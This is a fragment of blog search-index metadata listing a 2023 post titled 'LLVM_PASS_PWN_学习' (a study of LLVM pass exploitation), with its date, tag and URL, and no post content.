","date":"2023-07-14","objectID":"/posts/llvm-pass-pwn-%E5%AD%A6%E4%B9%A0/:0:0","tags":["llvm"],"title":"LLVM_PASS_PWN_学习","uri":"/posts/llvm-pass-pwn-%E5%AD%A6%E4%B9%A0/"}]